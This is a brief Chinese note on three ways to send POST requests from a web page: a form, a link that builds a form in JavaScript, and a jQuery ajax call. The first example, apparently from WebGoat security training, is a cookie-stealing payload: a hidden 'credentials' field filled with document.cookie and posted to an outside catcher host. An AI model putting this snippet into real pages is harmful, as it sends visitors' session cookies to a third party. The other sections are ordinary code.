
# POST 提交方法

## form表单

```
<form action="http://172.128.11.220:22224/webgoat/catcher?PROPERTY=yes"  method="POST">
	<input type="text" name="Username">
	<input type="hidden" id="evilinput" name="credentials"> 
	<input type="submit">

<script>
document.getElementById("evilinput").value=document.cookie
</script>

```
## a标签
```html

<a href="javascript:doPost("addStudent.action", {"name":"张三"})">提交</a>

<script>
	function doPost(to, p) { // to:提交动作（action）,p:参数
		var myForm = document.createElement("form");
		myForm.method = "post";
		myForm.action = to;
		for (var i in p){
			var myInput = document.createElement("input");
			myInput.setAttribute("name", i); // 为input对象设置name
			myInput.setAttribute("value", p[i]); // 为input对象设置value
			myForm.appendChild(myInput);
		}
		document.body.appendChild(myForm);
		myForm.submit();
		document.body.removeChild(myForm); // 提交后移除创建的form
	}
</script>

```

## ajax

```html
<!--使用了jquery-->
<a href="addStudent.action" class="a_post">提交</a>

<script>
	$(".a_post").on("click",function(event){
		event.preventDefault(); // 使a自带的方法失效，即无法向addStudent.action发出请求
		$.ajax({
			type: "POST", // 使用post方式
			url: "addStudent.action",
			contentType:"application/json",
			data: JSON.stringify({param1:value1, param2:value2}), // 参数列表，stringify()方法用于将JS对象序列化为json字符串
			dataType:"json",
			success: function(result){
				// 请求成功后的操作
			},
			error: function(result){
				// 请求失败后的操作
			}
		});
	});
</script>

```